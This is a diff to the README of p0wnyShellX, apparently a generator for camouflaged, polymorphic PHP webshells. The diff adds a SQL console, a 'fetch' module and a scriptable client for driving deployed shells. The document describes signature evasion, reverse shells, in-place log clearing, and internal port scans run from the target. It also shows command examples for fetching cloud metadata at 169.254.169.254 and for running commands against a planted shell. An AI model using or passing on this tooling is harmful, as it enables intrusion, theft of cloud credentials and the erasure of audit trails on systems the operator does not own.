@@ -57,7 +57,7 @@ flowchart LR
 | Junk code | None | 20–80 dynamically generated decoy functions |
 | Exec fallback order | Fixed | Weighted shuffle per run + random method drop |
 | AJAX transport | Cleartext, fixed parameter names | `plain` / `mimic` / `rc4` — per-build keys and parameter names |
-| Optional modules | — | `revshell`, `clearlog`, `portscan`, `pingsweep` — compiled in only when requested |
+| Optional modules | — | `revshell`, `clearlog`, `portscan`, `pingsweep`, `sql`, `fetch` — compiled in only when requested |
 | CSS camouflage | Transparent webshell | 11 camouflage themes + `poly` (random palette per build) + `none` (no CSS) |
 | Password in file | — | bcrypt hash only — plaintext never stored |
 | Pool augmentation | — | Optional LLM-generated atoms per build (`--llm`, local or cloud) + target-context naming (`--company`/`--context`) |
@@ -76,15 +76,17 @@ flowchart LR
 | Communication | XOR+gzip+base64 in POST body, obfuscated header/footer | 3 modes, both directions: `plain` (cleartext), `mimic` (base64 + random param names), `rc4` (RC4 + per-build shuffled base64 alphabet) |
 | Interface | Python CLI client | Browser terminal — no tooling on operator machine |
 | Camouflage | Bare PHP snippet | 11 themed fake dashboards + `poly` (random palette per build) + `none` |
-| Modules | ~30 (SQL console, proxy, audit, bruteforce…) | Core: shell, upload, download, tab-complete. Opt-in at build time: `revshell`, `clearlog`, `portscan`, `pingsweep` |
+| Modules | ~30 (SQL console, proxy, audit, bruteforce…) | Core: shell, upload, download, tab-complete. Opt-in at build time: `revshell`, `clearlog`, `portscan`, `pingsweep`, `sql`, `fetch` |
 | Exec methods | 9 — `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `pcntl_fork`, `python_eval`, `perl_system` — shuffled | 4–6 per build — `exec`, `shell_exec`, `system` always present; `passthru`, `popen`, `proc_open` randomly dropped (~30% each); weighted order (reliable methods tend first) |
 | `disable_functions` bypass | Yes — mod_cgi + `.htaccess` (Apache only, requires `AllowOverride` + write access) | No — not planned as a priority; the technique requires Apache + mod_cgi + AllowOverride + a web-writable directory, conditions rarely all met in production |
 | Reverse shell | Yes | Yes — `revshell <IP> <PORT>` (bash → python3 → perl → php, first available) |
 | Log clearing | Yes | Yes — `clearlog <file> <pattern>` strips matching lines in-place |
 | Port scan / host discovery | Yes (`:net_scan`) | Yes — `portscan` and `pingsweep`, via fsockopen from the target host |
-| SQL console | Yes (`:sql_console`) | Not yet — see TODO |
+| SQL console | Yes (`:sql_console`) | Yes — `sql <dsn> [user pass] <query>` (PDO: sqlite, mysql, pgsql…) |
+| Automation | Python CLI client | `tools/shellx_client.py` — scriptable client that parses the build's protocol (sidecar or shell file) |
+| Pivoting | Yes (`:net_proxy`, SOCKS) | Partial — `fetch <url>` retrieves remote content through the target; full SOCKS proxy not implemented |
 
-**Where Weevely still leads, and the plan to close it.** The remaining gaps are a non-interactive CLI client for scripting and automation (p0wnyShellX is browser-only by design today), a SQL console module, proxy/pivoting, and XOR+gzip+base64 transport. They are tracked in [TODO.md](TODO.md) — the stated goal of the project is full parity, so that "Weevely *or* a browser shell" stops being a choice you have to make.
+**What still separates them.** Weevely keeps an edge on module breadth (audit, bruteforce, file attribute editing) and offers a true SOCKS proxy; p0wnyShellX answers with per-build polymorphism, themed camouflage, and a browser UI that needs zero tooling on the operator machine. The remaining gaps are tracked in [TODO.md](TODO.md) — the stated goal of the project is full parity, so that "Weevely *or* a browser shell" stops being a choice you have to make.
 
 ---
 
@@ -379,6 +381,14 @@ python3 p0wnyShellX.py [OPTIONS]
 | `--clearlog` | `clearlog` command | Strip regex-matching lines from a log file in-place |
 | `--portscan` | `portscan` command | TCP port scan from the target host |
 | `--pingsweep` | `pingsweep` command | TCP-based host discovery from the target host |
+| `--sql` | `sql` command | SQL console via PDO — `sql <dsn> [user pass] <query>` (sqlite, mysql, pgsql…) |
+| `--fetch` | `fetch` command | Fetch a URL *from the target host* — curl → fopen → raw socket fallback (pivot recon) |
+
+**Companion tooling**
+
+| Flag | Description |
+|---|---|
+| `--client-config PATH` | Write a sidecar JSON describing this build's protocol (routes, parameter names, crypto) for `tools/shellx_client.py` — keep it off the target machine |
 
 ### Examples
 
@@ -462,6 +472,32 @@ Once deployed and authenticated, the shell supports:
 | `clearlog` | `clearlog <file> <pattern>` | Strip lines matching `<pattern>` (case-insensitive regex) in-place from `<file>`. |
 | `portscan` | `portscan <target> <ports> [--stealth\|--fast] [--timeout N] [--pause N]` | TCP scan from the target host. |
 | `pingsweep` | `pingsweep <target> [--ports <list>] [--stealth\|--fast] [--timeout N] [--pause N]` | TCP-based host discovery from the target host. |
+| `sql` | `sql <dsn> [user pass] <query>` | SQL console via PDO. Credentials are read for non-`sqlite:` DSNs. Queries answer with an aligned table (100-row cap), other statements with an affected-row count. |
+| `fetch` | `fetch <url>` | Fetch an http(s) URL **from the target host** — internal portals, cloud metadata endpoints (`169.254.169.254`), services unreachable from your machine. curl → fopen → raw socket fallback. |
+
+---
+
+## Non-interactive CLI client
+
+The browser is the primary interface, but `tools/shellx_client.py` gives you Weevely-style automation: scriptable, pipeable command execution against a deployed shell. It learns the per-build protocol — routing tokens, parameter names, transport encoding, crypto material — from the generator sidecar (`--client-config`) or by parsing the generated `shell.php` directly (exec only in that mode; feature commands need the sidecar).
+
+```bash
+# One-shot
+python3 tools/shellx_client.py --url http://target/shell.php --config client.json \
+    -u sysadmin -p 'MyPass!' -c "id"
+
+# Feature commands work too (sidecar required)
+python3 tools/shellx_client.py --url http://target/shell.php --config client.json \
+    -u sysadmin -p 'MyPass!' -c "portscan 10.0.0.0/28 top20 --fast"
+
+# Batch / piped
+printf 'id\nwhoami\npwd\n' | python3 tools/shellx_client.py --url ... --config client.json -u .. -p ..
+
+# Interactive when no command is given
+python3 tools/shellx_client.py --url ... --shell ./shell.php -u sysadmin -p 'MyPass!'
+```
+
+Works across all three transports (the client replicates `plain`/`mimic`/`rc4` encodings), tracks `cd` state between commands, and exits non-zero on auth or protocol failure so scripts can branch on it.
 
 **portscan / pingsweep — target formats**
 
@@ -533,7 +569,9 @@ Omit `--theme` to pick at random from the named themes below (`poly` and `none` 
 
 ## CI/CD
 
-On every push and PR, a GitHub Actions suite generates 10 shells across the option matrix (named themes, `poly`, `none`, junk levels, transport modes, optional modules) and asserts: `php -l` passes on all of them, no static signature survives, two consecutive runs never produce the same file while two runs with the same `--seed` produce byte-identical ones, mimic mode randomizes parameter names, rc4 mode injects `tEnc`/`tDec` with no plaintext parameter left, and the exec fallback chain stays intact.
+On every push and PR, a GitHub Actions suite generates 11 shells across the option matrix (named themes, `poly`, `none`, junk levels, transport modes, optional modules) and asserts: `php -l` passes on all of them, no static signature survives, two consecutive runs never produce the same file while two runs with the same `--seed` produce byte-identical ones, mimic mode randomizes parameter names, rc4 mode injects `tEnc`/`tDec` with no plaintext parameter left, and the exec fallback chain stays intact.
+
+The same workflow then runs the **pytest suite** (`tests/`): offline unit tests for the generator and the whole LLM layer, plus a runtime end-to-end suite that serves real builds with `php -S` and drives them over the actual HTTP protocol — authentication, command execution, `cd` persistence, all three transports, the optional feature commands, the `fetch` module on both HTTP paths, and the `sql` console against a live sqlite database.
 
 On a version tag (`v*.*.*`), a second workflow additionally publishes a GitHub Release with `p0wnyShellX.py` and a freshly generated example shell as assets.
 
@@ -555,6 +593,7 @@ On a version tag (`v*.*.*`), a second workflow additionally publishes a GitHub R
 - `--no-auth` removes the login form, the session and the hash: anyone who reaches the URL gets a shell. Reserve it for throwaway lab use, and pair it with an unguessable filename.
 - If PHP is absent from the operator machine at build time, the generator falls back to a reversible hex encoding of the password and prints a loud warning — do not deploy a shell built that way.
 - `--company` sends the target organization's name to the LLM provider. With a cloud API (OpenAI, Anthropic, Deepseek, Kimi) that leaks engagement metadata to a third party — use `--llm ollama` (local, nothing leaves the machine) for sensitive targets.
+- `fetch` disables TLS verification by design: it exists to reach internal services and metadata endpoints through the target, where self-signed certificates are the norm. Treat its output as unauthenticated recon data.
 
 ---
 
